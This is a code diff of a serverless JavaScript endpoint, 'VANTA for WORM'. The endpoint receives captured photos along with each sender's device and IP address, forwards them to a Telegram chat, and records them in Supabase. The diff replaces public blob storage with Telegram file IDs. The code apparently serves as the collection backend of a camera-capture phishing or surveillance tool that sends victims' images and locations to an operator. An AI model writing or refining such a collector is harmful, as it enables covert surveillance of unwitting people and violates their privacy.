@@ -1,7 +1,4 @@
 // api/send.js — VANTA for WORM
-// يستقبل الصورة + يحفظها في Blob + Supabase + يرسلها
-
-const { put } = require('@vercel/blob');
 
 const SB_URL = process.env.SUPABASE_URL;
 const SB_KEY = process.env.SUPABASE_SERVICE_KEY;
@@ -53,28 +50,6 @@ export default async function handler(req, res) {
       }
     }
 
-    // حفظ الصورة في Vercel Blob
-    let imageUrl = null;
-    try {
-      const blob = await put(
-        'shots/' + Date.now() + '-' + recipient + '.jpg',
-        buf,
-        { access: 'public', contentType: 'image/jpeg' }
-      );
-      imageUrl = blob.url;
-    } catch (e) {}
-
-    // حفظ في Supabase
-    try {
-      await sb('images', 'POST', {
-        chat_id: parseInt(recipient) || 0,
-        device: device,
-        ip: ip,
-        image_url: imageUrl
-      });
-    } catch (e) {}
-
-    // إرسال لتلغرام
     const caption = '📸 صورة جديدة\n📱 ' + device + '\n🌐 ' + ip;
 
     const boundary = '----v' + Date.now();
@@ -91,6 +66,21 @@ export default async function handler(req, res) {
     });
 
     const out = await tg.json();
+    let fileId = '';
+    if (out && out.ok && out.result && out.result.photo) {
+      fileId = out.result.photo[out.result.photo.length - 1].file_id;
+    }
+
+    // حفظ في Supabase
+    try {
+      await sb('images', 'POST', {
+        chat_id: parseInt(recipient) || 0,
+        device: device,
+        ip: ip,
+        image_url: fileId
+      });
+    } catch (e) {}
+
     res.status(200).json({ ok: !!out.ok });
   } catch (e) {
     res.status(500).json({ ok: false, err: String(e) });
